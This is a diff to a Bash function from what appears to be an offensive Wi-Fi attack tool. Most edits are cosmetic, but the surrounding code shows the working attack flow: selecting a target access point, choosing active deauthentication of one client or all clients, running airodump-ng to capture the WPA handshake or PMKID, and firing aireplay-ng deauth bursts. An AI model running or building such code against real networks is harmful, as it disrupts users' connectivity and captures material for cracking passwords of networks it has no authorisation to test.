@@ -106,7 +106,7 @@ run_wifi_recon() {
         fi
     done < "$csv_file"
 
-    echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────⢢${NC}"
+    echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────╢${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}NUM  BSSID              CH   PWR   STAs  ENC      ESSID${NC}"
     echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
 
@@ -160,9 +160,9 @@ run_wifi_recon() {
 
     echo -e "${TXT_VOID}│${NC}"
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select target index to lock synaptic drill & capture handshake:${NC}"
-    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Target [1-${#bssids[@]}] (or press Enter to cancel): ${NC}"
+    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Target [1-${#bssids[@]}] (or press Enter to cancel): ${TXT_RED_PLASMA}"
     read -r target_choice
-    echo ""
+    echo -ne "${NC}"
 
     if [ -z "$target_choice" ] || ! [[ "$target_choice" =~ ^[0-9]+$ ]] || [ "$target_choice" -lt 1 ] || [ "$target_choice" -gt ${#bssids[@]} ]; then
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ * ] Target selection bypassed.${NC}"
@@ -177,13 +177,13 @@ run_wifi_recon() {
     local sel_essid="${essids[$target_idx]}"
     local capture_out="/tmp/handshake_${sel_bssid//:/}"
 
-    # Выбор стратегии перехвата
+    echo -e "${TXT_VOID}│${NC}"
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select Interception Strategy:${NC}"
-    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Passive Monitoring${NC} (Wait 90s for natural re-auth)"
-    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} (Inject Aireplay-ng Deauth impulses)"
-    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Strategy [1-2] (Default: 1): ${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Passive Monitoring${NC} ${TXT_DRK_RED}(Wait 90s for natural re-auth)${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} ${TXT_RED_MAGMA}(Inject Aireplay-ng Deauth impulses)${NC}"
+    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Strategy [1-2] (Default: 1): ${TXT_RED_PLASMA}"
     read -r strat_choice
-    echo ""
+    echo -ne "${NC}"
 
     local deauth_target=""
     if [[ "$strat_choice" == "2" ]]; then
@@ -207,18 +207,19 @@ run_wifi_recon() {
         done < "$csv_file"
 
         if [ ${#target_stations[@]} -gt 0 ]; then
+            echo -e "${TXT_VOID}│${NC}"
             echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// SELECTIVE DEAUTH MATRIX ]${TXT_VOID}───────────────────────────────────────⢢${NC}"
             local st_idx=1
             for sta in "${target_stations[@]}"; do
                 local formatted_st_num=$(printf "%02d" $st_idx)
-                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_st_num}]${NC} Target Station: ${TXT_RED_SUPERNOVA}${sta}${NC}"
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_st_num}]${NC} ${TXT_RED_LASER}Target Station:${NC} ${TXT_RED_SUPERNOVA}${sta}${NC}"
                 ((st_idx++))
             done
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[00] Broadcast Deauth${NC} (Target all stations simultaneously)"
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[00] Broadcast Deauth${NC} ${TXT_DRK_RED}(Target all stations simultaneously)${NC}"
             echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
-            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [00-$((st_idx-1))] (Default: 0): ${NC}"
+            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [00-$((st_idx-1))] (Default: 0): ${TXT_RED_PLASMA}"
             read -r sta_choice
-            echo ""
+            echo -ne "${NC}"
 
             if [[ "$sta_choice" =~ ^[1-9][0-9]*$ ]] && [ "$sta_choice" -le ${#target_stations[@]} ]; then
                 deauth_target="${target_stations[$((sta_choice-1))]}"
@@ -236,17 +237,14 @@ run_wifi_recon() {
     iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
 
     echo -e "${TXT_VOID}│${NC}"
-    echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} (${TXT_B_ALARM}${sel_bssid}${NC})"
+    echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} ${TXT_VOID}(${TXT_B_ALARM}${sel_bssid}${TXT_VOID})${NC}"
     echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Monitoring for PMKID / WPA Handshake (90s)...${NC}"
 
-    # Запуск airodump-ng ДО импульса deauth
     airodump-ng --bssid "$sel_bssid" --channel "$sel_ch" --write "$capture_out" "$iface" >/dev/null 2>&1 &
     local cap_pid=$!
 
-    # Задержка на инициализацию пакетов
     sleep 2
 
-    # Двойной импульс Deauth при выборе активной стратегии
     if [[ "$strat_choice" == "2" ]]; then
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_ALARM}[ * ] FIRING DEAUTH IMPULSES VIA AIREPLAY-NG (BURST 1/2)...${NC}"
         if [ -n "$deauth_target" ]; then
